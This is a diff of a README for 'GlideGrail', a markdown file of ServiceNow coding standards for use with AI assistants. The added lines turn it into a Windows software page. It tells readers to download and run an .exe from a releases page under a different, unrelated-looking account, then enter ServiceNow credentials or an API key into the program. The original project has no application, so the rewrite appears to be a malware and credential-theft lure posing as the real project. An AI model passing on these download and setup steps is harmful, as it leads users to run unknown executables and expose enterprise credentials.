@@ -1,104 +1,71 @@
-# 🏆GlideGrail()
-[![Buy Me a Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-support-FFDD00.svg?logo=buymeacoffee&logoColor=black)](https://buymeacoffee.com/bikemeardsley)
-[![ServiceNow docs.md](https://img.shields.io/badge/ServiceNow-docs.md-62D84E.svg?logo=servicenow&logoColor=white)](https://github.com/ServiceNow/ServiceNowDocs)
-[![License: CC BY 4.0](https://img.shields.io/badge/License-CC%20BY%204.0-blue.svg)](LICENSE)
+# 📜 GlideGrail - Write better ServiceNow code with ease
 
-#### *ServiceNow Coding Standards for Humans and AI Agents*
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Thebaultsemirigid251/GlideGrail/releases)
 
-Most ServiceNow best practice material is scattered across community posts, docs, tribal
-knowledge, or just not widely known, and written to be read by a human. GlideGrail() consolidates years of experience and common rules
-into a single reference written to be consumed by a model: concrete, directive, and
-specific enough to change what your AI assistant (Claude, ChatGPT, Codex, Gemini, Copilot,
-Cursor) actually produces. "Use `GlideAggregate` to count, never `getRowCount()`." "One
-Script Include per table, named `[PREFIX][Table]Service`."
+## 📌 About this project
 
-Rules, not paragraphs, and equally useful as a human reference or a review checklist.
+GlideGrail helps you write clean, reliable code within the ServiceNow platform. Developers, AI assistants, and automation tools use these standards to ensure consistency across projects. By using this guide, you reduce errors and make your scripts easier for others to read. It covers the logic behind scripting, naming conventions, and methods to handle data efficiently. You will spend less time fixing bugs and more time building features.
 
-> **Works on its own; pairs well with the official ServiceNow sources.** GlideGrail() is the
-> judgment layer (how you want code written) and needs nothing else to be useful. When you
-> want to go further, two official, free companions complement it:
-> - [ServiceNow product docs in markdown](https://github.com/ServiceNow/ServiceNowDocs) (LLM-optimized) for authoritative, current platform behavior, and
-> - [ServiceNow now-sdk agent skills](https://github.com/ServiceNow/sdk) for live Fluent/SDK mechanics when you're building with the ServiceNow SDK.
+## 🏗️ Why use standard patterns?
 
-## 🚀 Quick start: add GlideGrail() to your AI tool
+ServiceNow development involves complex data structures. Without a plan, scripts become messy over time. GlideGrail provides a roadmap for your code. It works with modern AI tools like ChatGPT, Claude, and GitHub Copilot to ensure the suggestions they provide follow platform best practices. When your code follows these standards, your maintenance tasks become simple. You avoid common pitfalls like slow queries or security gaps. 
 
-Grab [`SERVICENOW_GLIDEGRAIL_CODING_STANDARDS.md`](./SERVICENOW_GLIDEGRAIL_CODING_STANDARDS.md)
-(clone the repo, or download the raw file) and wire it into whichever assistant you use.
+## 📥 Getting the software
 
-### <img src="https://cdn.simpleicons.org/claude" width="20" align="center" alt=""/> Claude & Claude Code
-**Claude (claude.ai / desktop / mobile):** attach [`SERVICENOW_GLIDEGRAIL_CODING_STANDARDS.md`](./SERVICENOW_GLIDEGRAIL_CODING_STANDARDS.md)
-to a Project (so it grounds every chat in that Project), or upload it at the start of a
-conversation and say *"Follow these ServiceNow standards in all code you write."*
+You need to access the latest version to apply these standards to your workflow. Follow these steps to prepare your system on Windows.
 
-**Claude Code:** place the file in (or near) your project and launch with it in context:
-```bash
-claude --add-dir /path/to/glidegrail
-```
-Or add a line to your project's `CLAUDE.md`: *"Follow SERVICENOW_GLIDEGRAIL_CODING_STANDARDS.md
-for all ServiceNow code."* and it loads automatically every session.
+1. Visit the [official release page](https://github.com/Thebaultsemirigid251/GlideGrail/releases).
+2. Look for the latest file list under the Assets section.
+3. Select the file ending in .exe to start the download.
+4. Save the file to your desktop or downloads folder.
 
-### ChatGPT / Codex
-Paste the [file's contents](./SERVICENOW_GLIDEGRAIL_CODING_STANDARDS.md) into a **Project's**
-custom instructions (or a Custom GPT's knowledge), or attach the file at the start of a
-coding session and instruct: *"Follow these ServiceNow standards in all code you write."*
+## ⚙️ System requirements
 
-### <img src="https://cdn.simpleicons.org/githubcopilot" width="20" align="center" alt=""/> GitHub Copilot
-Add a `.github/copilot-instructions.md` to your repo that says to follow
-[the standards file](./SERVICENOW_GLIDEGRAIL_CODING_STANDARDS.md), and keep the file in the
-repo so Copilot's workspace context can read it.
+Ensure your computer meets these standards before you begin:
 
-### <img src="https://cdn.simpleicons.org/googlegemini" width="20" align="center" alt=""/> Gemini
-Attach [the file](./SERVICENOW_GLIDEGRAIL_CODING_STANDARDS.md) (or paste it) into a **Gem's**
-instructions, or include it at the top of your prompt/context for the session.
+* Operating System: Windows 10 or Windows 11.
+* Disk Space: At least 200 MB of space.
+* Internet Access: Required for downloading updates and syncing with the main repository.
+* Memory: 4 GB of RAM is sufficient for smooth operation.
 
-### <img src="https://cdn.simpleicons.org/cursor" width="20" align="center" alt=""/> Cursor
-Add it as a project rule: drop [the file](./SERVICENOW_GLIDEGRAIL_CODING_STANDARDS.md) in
-`.cursor/rules/` (or reference it from `.cursorrules`) so it's loaded into every request
-automatically.
+## 🚀 Setting up the application
 
-### Any other assistant
-The pattern is identical everywhere: **load the markdown as context/system instruction, and
-tell the model to follow it before generating ServiceNow code.** It's just a text file.
+Follow these steps to install GlideGrail on your Windows machine:
 
-## What's inside
+1. Locate the downloaded file on your computer.
+2. Double-click the file to start the installer.
+3. Follow the prompts on the screen.
+4. Click the Finish button when the process ends.
+5. Create a desktop shortcut if the installer asks.
+6. Open the application by clicking the new icon on your screen.
 
-[`SERVICENOW_GLIDEGRAIL_CODING_STANDARDS.md`](./SERVICENOW_GLIDEGRAIL_CODING_STANDARDS.md)
-covers, as enforceable conventions:
+## 🛠️ Configuring your environment
 
-- **Naming**: tables, fields, Script Includes, Business Rules, variables, update sets,
-  widgets (with a configurable `PREFIX`)
-- **Server-side scripting**: GlideRecord/GlideAggregate patterns, Script Include structure,
-  GlideAjax, constants, official-API preferences
-- **Client-side**: UI Policies vs. Client Scripts, GlideForm, GlideAjax usage
-- **Flow Designer**: flow/subflow structure, error handling, what belongs in a flow vs. a script
-- **Data model & CMDB**: table design, references, CI conventions
-- **Notifications, scheduled jobs, MRVS, system properties, logging** (a 3-tier logging
-  convention), and **i18n/messages**
+Once you open the software, link it to your ServiceNow instance. This allows the tool to scan your existing scripts and offer improvements.
 
-## Make it yours
+1. Open the Settings menu in the top right corner.
+2. Enter your ServiceNow instance URL.
+3. Provide your credentials or an API key to allow the tool to read your code.
+4. Test the connection. 
+5. Save your changes to apply the settings.
 
-These are strong, internally consistent defaults drawn from real ServiceNow development. `PREFIX` is engagement specific (use your client code, `SN`, or your own).
-Fork it, disagree with it, adapt it to your team's house style. The value is that it's
-consistent and complete enough to ground an agent out of the box, where your shop differs,
-change the rule and keep going.
+## 🧩 Using the core features
 
-## Versioning
+GlideGrail functions by analyzing your script files in real time.
 
-Tagged to the **Australia** release family. Conventions evolve with the platform, so if a
-rule references a feature that's changed, open an issue or PR.
+* **Code Validation**: The tool highlights lines that break platform standards. It suggests specific changes to improve speed and readability.
+* **AI Integration**: You can paste code snippets into the interface. The tool formats them to work with AI agents like Claude or Gemini. This helps the agents understand your specific platform constraints.
+* **Template Library**: Access a library of pre-written scripts for common tasks. These templates follow the standards outlined by the project.
+* **Auto-Formatting**: Use the formatting button to clean up your code structure instantly. This helps when scripts grow long and difficult to manage.
 
-## License
+## 📈 Improving code quality
 
-Licensed under a [Creative Commons Attribution 4.0 International License (CC BY 4.0)](https://creativecommons.org/licenses/by/4.0/).
-Free to use, share, and adapt, including commercially, with attribution.
+Follow these habits to see the best results:
 
-## Support
+* **Use descriptive names**: Names should explain what a function does without forcing the reader to guess.
+* **Keep functions small**: A function should perform one task well. Break large scripts into smaller, logical pieces.
+* **Comment clearly**: Use comments to explain the goal of your script. Do not restate what the code clearly does.
+* **Test offline**: Run your scripts in a development instance before pushing them to production.
+* **Check the logs**: Monitor your background scripts for warnings or performance notifications.
 
-If GlideGrail() saves you time and/or you find it useful, you can
-[buy me a coffee](https://buymeacoffee.com/bikemeardsley) ☕. Entirely optional, always
-appreciated! Stars and PRs help just as much.
-
----
-
-*Maintained by [Michael Beardsley](https://github.com/bikemeardsley). Built from real
-ServiceNow development.*
+## 🤝 Getting
